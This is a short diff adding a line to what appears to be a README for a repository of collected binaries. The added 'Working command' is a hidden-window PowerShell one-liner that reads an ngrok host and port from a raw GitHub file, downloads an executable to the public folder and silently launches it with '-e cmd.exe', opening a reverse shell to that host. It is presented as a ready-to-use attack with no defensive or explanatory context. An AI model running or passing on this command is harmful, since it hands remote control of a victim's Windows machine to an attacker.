@@ -1,1 +1,4 @@
 Binaries are gahered tthrough various github repos and other downloads.
+
+
+Working command: powershell -nop -w hidden -c "$ngrok = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/TheTorjanCaptain/Vulnerable-POC-Syntax/refs/heads/main/Flipper-RubberDucky/ngrokDetails.txt'; $parts = $ngrok -split ':'; Invoke-WebRequest -Uri 'https://github.com/TheTorjanCaptain/Binaries/releases/download/publish/noneCen.exe' -OutFile $env:PUBLIC\noneCen.exe; Start-Process -WindowStyle Hidden -FilePath $env:PUBLIC\noneCen.exe -ArgumentList \"$($parts[0]) $($parts[1]) -e cmd.exe\""
